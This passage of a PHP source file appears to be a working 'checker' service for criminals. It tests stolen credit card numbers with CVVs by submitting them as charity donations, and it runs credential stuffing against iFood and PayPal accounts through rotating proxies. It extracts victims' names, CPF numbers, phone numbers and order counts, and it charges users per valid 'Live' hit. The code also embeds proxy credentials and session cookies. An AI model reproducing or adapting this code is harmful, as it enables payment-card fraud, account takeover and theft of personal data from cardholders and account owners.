    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,  '{"supplementary":{"private":{"modified_address":"NV","suppression_email":"PUEM","suppression_text":"PUSM","suppression_phone":"PUPH","suppression_post":"PUPO","ispersonal":"This is my own money","apple_pay_used":"N","form_id":"DON000013","name":"My donation","description":"cancer research uk"}},"payment_amount":50,"paypal_gateway":"PAYPAL_EC","gateway":"ONLINEDONATIONSHHH","payment_card":{"type":"MASTERCARD","name":"Bbb hh","number":"'.$cc.'","expiry_date":{"month":"'.$mes.'","year":"'.$ano.'"},"cvc":"'.$cvv.'"},"address":{"salutation":"Miss","other":false,"first_name":"Nnhjh","last_name":"Bbh","email":"nbhhh@gmail.com","phone":"3336669895","line1":"Hhhjjj","line2":"Hhhh","line3":"Hhh","town":"Hh","postal_code":"10001","country":"US"},"receiver":{"id":"1VQPM7-MS87CUF-69B0ATI3-LRDPD725LYY","type":"campaign"},"payment_currency":"GBP","billing_address":{"salutation":"Miss","other":false,"first_name":"Nnhjh","last_name":"Bbh","email":"nbhhh@gmail.com","phone":"3336669895","line1":"Hhhjjj","line2":"Hhhh","line3":"Hhh","town":"Hh","postal_code":"10001","country":"US"},"optin":{"giftaid":false}}');
  $resultado = curl_exec($ch);
 

$valores = array('R$ 1,00','R$ 50,50','R$ 50,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
if (strpos($resultado, "https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb") !== false) {

echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $cc|$mes|$ano|000  [ SEM VBV ] Debitou: $debitouu <span class='badge badge-light'> $bin</span>  - #ComedorDeCasadassabia";
debitar_creditos("1.5");
contar_cc();
}elseif (strpos($resultado, "https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb") !== false) {
 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $cc|$mes|$ano|000 <span class='badge badge-light'> $bin</span>  - #ComedorDeCasadassabia";
debitar_creditos("1.5");
contar_cc();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $cc|$mes|$ano|000 - #ComedorDeCasadassabia";
    }


  break;

  case 'ifood':
    function __curl($opcoes) {
        $ch = curl_init();
        curl_setopt_array($ch, $opcoes);

        $exec = curl_exec($ch);
        return $exec;
    }


    $lista = $_GET['lista'];
    $separa = explode("|",$lista);
    $email = $separa[0];
    $senha = $separa[1];
    $username = 'danielgay';
    $password = 'danielgay12';
    $proxy = 'us.smartproxy.com:10000';

    $opt = array(
        CURLOPT_URL => "https://marketplace.ifood.com.br/v1/identity-providers?tenant_id=IFO&email=$email",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => array("X-Ifood-Session-Id: b335a34c-4147-4895-aab6-605b7bdf444c", "X-Ifood-Cloud-Id: 7ac16cb2-7745-450a-9dec-12d6e4ae73a0", "X-Ifood-Device-Id: e0d55ef66e528911", "Host: marketplace.ifood.com.br", "Connection: Keep-Alive", "User-Agent: okhttp/3.10.0"),
        CURLOPT_POST => 0);
    $parte_1 = __curl($opt);


    $opt = array(
        CURLOPT_URL => "https://marketplace.ifood.com.br/identity-providers/IFOOD/authentications",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => "gzip",
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => "$username:$password",
        CURLOPT_HTTPHEADER => array("X-Ifood-Session-Id: b335a34c-4147-4895-aab6-605b7bdf444c", "X-Ifood-Cloud-Id: 7ac16cb2-7745-450a-9dec-12d6e4ae73a0", "X-Ifood-Device-Id: e0d55ef66e528911", "Content-Type: application/json; charset=utf-8", "Content-Length: 134", "Host: marketplace.ifood.com.br", "Connection: Keep-Alive", "User-Agent: okhttp/3.10.0"),
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => '{"email":"'.$email.'","password":"'.$senha.'","device_id":"e0d55ef66e528911","tenant_id":"IFO","identity_provider":"IFOOD"}');
    $parte_2 = __curl($opt);
    $json = json_decode($parte_2,true);
    extract($json);

    $opt = array(
      CURLOPT_URL => "https://marketplace.ifood.com.br/v1/customers/me/account",
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_PROXY => $proxy,
      CURLOPT_PROXYUSERPWD => "$username:$password",
      CURLOPT_HTTPHEADER => array(
            "x-ifood-session-id: 0c7a4f72-ca12-4df4-83b5-b28e6f38b1e6",
            "x-ifood-cloud-id: d80bd034-29ff-35ee-adf1-9defb93d7425",
            "x-ifood-device-id: d80bd034-29ff-35ee-adf1-9defb93d7425",
            "x-ifood-request-id: 6021d08162ca489498c5ab468d7f8f4c7425",
            "authorization: Bearer $access_token",
            "browser: samsung  SMG935F",
            "platform: Android",
            "app_build: 29092603",
            "app_version: 9.26.0",
            "user-agent: okhttp/3.14.2"),
      CURLOPT_POST => 0);

    $parte_3 = __curl($opt);
    $json = json_decode($parte_3,true);

    $nome = $json['name'];
    $cpf = $json['tax_payer_identification_number'];
    $ddd = $json['phone']['area_code'];
    $number = $json['phone']['number'];
    $telefone = "($ddd)$number";

    $opt = array(
      CURLOPT_URL => "https://marketplace.ifood.com.br/v3/customers/me/orders?page=0",
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_PROXY => $proxy,
      CURLOPT_PROXYUSERPWD => "$username:$password",
      CURLOPT_HTTPHEADER => array(
            "x-ifood-session-id: 0c7a4f72-ca12-4df4-83b5-b28e6f38b1e6",
            "x-ifood-cloud-id: d80bd034-29ff-35ee-adf1-9defb93d7425",
            "x-ifood-device-id: d80bd034-29ff-35ee-adf1-9defb93d7425",
            "x-ifood-request-id: 6021d08162ca489498c5ab468d7f8f4c7425",
            "authorization: Bearer $access_token",
            "browser: samsung  SMG935F",
            "platform: Android",
            "app_build: 29092603",
            "app_version: 9.26.0",
            "user-agent: okhttp/3.14.2"),
      CURLOPT_POST => 0);

    $parte_4 = __curl($opt);
    $pedidos = substr_count($parte_4,"lastStatus");

    $infoGeral = "Nome: $nome CPF: $cpf Telefone $telefone Pedidos: $pedidos";


    if(strpos($parte_2,"access_token")!== false){
      echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'>$infoGeral </span>  - #striker-";
    }
    elseif(strpos($parte_1,"ACCOUNT_KIT")!== false){
      echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha Retorno: Pedindo SMS -  #STRIKER";
    }
    elseif(strpos($parte_2,"User is unauthorized")!== false){
    echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha Retorno: User is unauthorized - #STRIKER";
    }
    else{
        echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha Retorno: DESCONHECIDO (PROVAVELMENTE PROXY)- #STRIKER";
    }
/*

if (strpos($step1, 'session_token')) {
  echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'> Compras: $compra $dropp </span>&nbsp <span class='badge badge-info'> Card: $card </span> <span class='badge badge-info'>SaldoConta: $wish_cash_balance </span>  - #striker-";
  debitar_creditos("0.10");
  contar_login();


}else{
  echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha Retorno: $retorno- #STRIKER";
*/

    break;

  case 'pp':
   error_reporting(1);
    set_time_limit(0);
    $conta = $_GET["lista"];
    $email = explode("|", $conta)[0];
    $senha = explode("|", $conta)[1];

    function Pesquisa($conteudo, $inicio, $termino) {
        try {
            $conteudo = explode($inicio, $conteudo);
            $conteudo = explode($termino, $conteudo[1]);
            return $conteudo[0];
        } catch (Exception $erro) {
            return "Ocorreu um erro ao fazer a pesquisa: ".$erro->getMessage();
        }
    }

    $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://checkout.paypal.com/paypal/v1/oauth2/token');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  //curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY("Origin: https://checkout.paypal.com", "PayPal-Client-Metadata-Id: 1d37bf44-aa79-4d6e-9323-ebe438753185", "Authorization: Basic QWRiY0J1cXZpOTRCZ1MwVFlremNWRzcxUVZSY2tzTU5fTXZqeXVqZnUzd2Y2blA2Y1NVMU9kOV9nd08wdktBOGlHWldWTkRSLVhxbW11alc6", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8", "Accept: application/json, text/javascript, */*; q=0.01", "X-Requested-With: XMLHttpRequest", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36", "PayPal-Application-Correlation-Id: 1d37bf44-aa79-4d6e-9323-ebe438753185", "Referer: https://checkout.paypal.com/pwpp/2.31.0/html/braintree-frame.html", "Accept-Encoding: gzip, deflate, br", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Cookie: cookie_check=yes; X-PP-K=1545775162:5:NA; _ga=GA1.2.647467269.1545775162; navlns=0.0; ui_experience=login_type%3DEMAIL_PASSWORD%26home%3D2%26ph_conf%3D3%253A1554429443375; feel_cookie=a%2010%20_login-run%20b%2027%20_restricted-appeal-fax-info%20c%206%20webscr%20d%206%20webscr%20e%2026%20Customer%2fgeneral%2fLogin.xsl%20f%2034%20CaseManagement%2fgeneral%2fFaxStep.xsl%20g%205%20pt_BR%20h%205%20pt_BR%20i%2011%20p%2fgen%2flogin%20j%2014%20p%2fgen%2ffax_step%20k%2020%20Erro%20-%20Acesse%20Brasil%20l%2066%20Central%20de%20solu%c3%a7%c3%b5es%20-%20P%c3%a1gina%20de%20disputa%20de%20limita%c3%a7%c3%a3o%20-%20PayPal%20; s_pers=%20s_fid%3D2D2001D914FFAA60-04511DB9D583A4A2%7C1609814050115%3B%20gpv_c43%3Dlog%2520in%7C1546657450118%3B%20gpv_events%3Dno%2520value%7C1546657450120%3B; consumer_display=USER_HOMEPAGE%3d0%26USER_TARGETPAGE%3d0%26USER_FILTER_CHOICE%3d0%26BALANCE_MODULE_STATE%3d1%26GIFT_BALANCE_MODULE_STATE%3d1%26LAST_SELECTED_ALIAS_ID%3d0%26SELLING_GROUP%3d1%26PAYMENT_AND_RISK_GROUP%3d1%26SHIPPING_GROUP%3d1%26HOME_VERSION%3d1546742051%26MCE2_ELIGIBILITY%3d4294967295; KHcl0EuY7AKSMgfvHl7J5E7hPtK=k1ghXgNVNrHmy_owxoSyNBloKAKv2t7AAzSCa1F2OTH0988jEzLo2MPxkciaMNkNxHZdHzo5pQBoH0D-; rmuc=ms6Uh03jlvqcDkvZ46YBnov9BdR2dYE04Ic6CTuS7CLlZXo5vGbtEiHEw6qKSs3yT5WBfv54SKY8QfAXikC6Lc_L1KXE0D55mA0wHX-wcfHQsm8PUqbmu6g8BS0; login_email=nadila.nascimento%40gmail.com; X-PP-ADS=AToBD9UwXEcR5rsdFz5DHS0P.FEw9x47AarONFyh7MatAi05JsrBueHS2RGBOwG4zjRcMV.F.gyBNS8Ua0toa8mjPw; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6Ik56cmxVVFJkTmRNRlBYR0lTOWppdzRkSVJSZG9XME1kRUR4akJJQ2dPeTZ5b3dVSk9Qc1ltLXJ1RGs2WWFPa2x2aGN1Y0VPbGNlZUVQOW5Gd3QyZVBXUFhHbUJJVXo1TGFHdExNTmRZeEhrT1Zjc0JzalM2QmlaYlRoWmdGdE1odjFKWURSZExCdFY4VDVlcklkdWw4VUxWeVdpTzdsMHdHMFZNeV9HYVFQWXdaYWlDY3ZTZmQ1dk8yRzBSeUotRnNKd2VyY2RrUVBqRzJ1Q1FNb1NxY21XWDZfMCIsImlhdCI6MTU0Njk2NDY5MiwiZXhwIjoxNTQ2OTY4MjkyfQ.jjceox5HbvlQMKdNmULGA8iXxAv9C7S4K07rGSqNYUY; ts=vreXpYrS%3D1641659124%26vteXpYrS%3D1546966524%26vr%3De7610a4e167ac12000183fbbfffffeec%26vt%3D2e41b9891680ac808fd26549fff66bb5; X-PP-SILOVER=name%3DLIVE5.API.1%26silo_version%3D880%26app%3Dapiplatformproxyserv%26TIME%3D1918580572%26HTTP_X_PP_AZ_LOCATOR%3D"));
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'grant_type=client_credentials&response_type=token&return_authn_schemes=true');
  $data = curl_exec($ch);

  //print_r($data);

  $tokenJson = json_decode($data, true);

  $token = $tokenJson["access_token"];
  $scope = $tokenJson["scope"];

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://checkout.paypal.com/paypal/v1/oauth2/login');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  //curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_PROXY, 'http://br.smartproxy.com:10000');
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'mangoloide171:mangoloide171');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY("Origin: https://checkout.paypal.com", "PayPal-Client-Metadata-Id: 1d37bf44-aa79-4d6e-9323-ebe438753185",
  "Authorization: Bearer ".$token,
  "Content-Type: application/x-www-form-urlencoded; charset=UTF-8", "Accept: application/json, text/javascript, */*; q=0.01", "X-Requested-With: XMLHttpRequest", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36", "PayPal-Application-Correlation-Id: 1d37bf44-aa79-4d6e-9323-ebe438753185", "Referer: https://checkout.paypal.com/pwpp/2.31.0/html/braintree-frame.html", "Accept-Encoding: gzip, deflate, br", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Cookie: cookie_check=yes; X-PP-K=1545775162:5:NA; _ga=GA1.2.647467269.1545775162; navlns=0.0; ui_experience=login_type%3DEMAIL_PASSWORD%26home%3D2%26ph_conf%3D3%253A1554429443375; feel_cookie=a%2010%20_login-run%20b%2027%20_restricted-appeal-fax-info%20c%206%20webscr%20d%206%20webscr%20e%2026%20Customer%2fgeneral%2fLogin.xsl%20f%2034%20CaseManagement%2fgeneral%2fFaxStep.xsl%20g%205%20pt_BR%20h%205%20pt_BR%20i%2011%20p%2fgen%2flogin%20j%2014%20p%2fgen%2ffax_step%20k%2020%20Erro%20-%20Acesse%20Brasil%20l%2066%20Central%20de%20solu%c3%a7%c3%b5es%20-%20P%c3%a1gina%20de%20disputa%20de%20limita%c3%a7%c3%a3o%20-%20PayPal%20; s_pers=%20s_fid%3D2D2001D914FFAA60-04511DB9D583A4A2%7C1609814050115%3B%20gpv_c43%3Dlog%2520in%7C1546657450118%3B%20gpv_events%3Dno%2520value%7C1546657450120%3B; consumer_display=USER_HOMEPAGE%3d0%26USER_TARGETPAGE%3d0%26USER_FILTER_CHOICE%3d0%26BALANCE_MODULE_STATE%3d1%26GIFT_BALANCE_MODULE_STATE%3d1%26LAST_SELECTED_ALIAS_ID%3d0%26SELLING_GROUP%3d1%26PAYMENT_AND_RISK_GROUP%3d1%26SHIPPING_GROUP%3d1%26HOME_VERSION%3d1546742051%26MCE2_ELIGIBILITY%3d4294967295; KHcl0EuY7AKSMgfvHl7J5E7hPtK=k1ghXgNVNrHmy_owxoSyNBloKAKv2t7AAzSCa1F2OTH0988jEzLo2MPxkciaMNkNxHZdHzo5pQBoH0D-; rmuc=ms6Uh03jlvqcDkvZ46YBnov9BdR2dYE04Ic6CTuS7CLlZXo5vGbtEiHEw6qKSs3yT5WBfv54SKY8QfAXikC6Lc_L1KXE0D55mA0wHX-wcfHQsm8PUqbmu6g8BS0; login_email=nadila.nascimento%40gmail.com; X-PP-ADS=AToBD9UwXEcR5rsdFz5DHS0P.FEw9x47AarONFyh7MatAi05JsrBueHS2RGBOwG4zjRcMV.F.gyBNS8Ua0toa8mjPw; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6Ik56cmxVVFJkTmRNRlBYR0lTOWppdzRkSVJSZG9XME1kRUR4akJJQ2dPeTZ5b3dVSk9Qc1ltLXJ1RGs2WWFPa2x2aGN1Y0VPbGNlZUVQOW5Gd3QyZVBXUFhHbUJJVXo1TGFHdExNTmRZeEhrT1Zjc0JzalM2QmlaYlRoWmdGdE1odjFKWURSZExCdFY4VDVlcklkdWw4VUxWeVdpTzdsMHdHMFZNeV9HYVFQWXdaYWlDY3ZTZmQ1dk8yRzBSeUotRnNKd2VyY2RrUVBqRzJ1Q1FNb1NxY21XWDZfMCIsImlhdCI6MTU0Njk2NDY5MiwiZXhwIjoxNTQ2OTY4MjkyfQ.jjceox5HbvlQMKdNmULGA8iXxAv9C7S4K07rGSqNYUY; ts=vreXpYrS%3D1641659124%26vteXpYrS%3D1546966524%26vr%3De7610a4e167ac12000183fbbfffffeec%26vt%3D2e41b9891680ac808fd26549fff66bb5; X-PP-SILOVER=name%3DLIVE5.APIC.1%26silo_version%3D880%26app%3Driskfraudnetapiserv_apic%26TIME%3D1180383068%26HTTP_X_PP_AZ_LOCATOR%3Ddcg12.slc"));
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&password='.$senha.'&grant_type=password&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&response_type=access_token&scope=openid%2Bprofile%2Bemail%2Baddress%2Bhttps%253A%252F%252Furi.paypal.com%252Fservices%252Fpaypalattributes');
  $data = curl_exec($ch);

    if(strpos($data, "access_token") !== false) {

 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha -> Sem Verificação - #striker-";
debitar_creditos("1.00");
contar_login();
    } else if (strpos($data, '"error_description":"Unable')) {
 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha -> Com Verificação - #striker-";

    } else {
echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha  Retorno: E-mail ou senha incorreta - #STRIKER";
    }

    break;

  default:
  echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i> CHECKER OFF FDP SABE LER NÃO? <i class='fa fa-times'></i>  ";

    break;

}
}

?>
